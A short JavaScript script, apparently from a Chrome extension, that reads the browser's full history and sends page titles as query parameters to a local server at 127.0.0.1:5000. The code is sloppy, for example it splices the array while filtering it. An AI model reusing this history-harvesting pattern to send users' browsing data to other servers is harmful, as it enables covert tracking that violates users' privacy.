var callback = function (results) {
    var count = 0;
    results.filter(function (item, key) {
        delete item['lastVisitTime'];
        delete item['id'];
        delete item['typedCount'];
        delete item['visitCount'];
        if (item.title == 'Google' || item.title == 'Facebook') {
            count++;
            results.splice(key, 1)
        }
        if (count > 50) {
            sendHistory(results)
            return results;
        }
    })
    sendHistory(results)
    return results;
}
var sendHistory = function (history) {
    console.log(history)
    var url = "?";
    var i = 0;
    history.forEach(function (e) {
        if (e.title != "") {
            i++;
            url += 'title' + i + '=' + e.title + "&";
        }
    });
    url = url.trim("&")
    var xhttp = new XMLHttpRequest();

    xhttp.open("GET", "http://127.0.0.1:5000/hello" + url, true);

    xhttp.send();
}

chrome.history.search({text: ''}, callback)

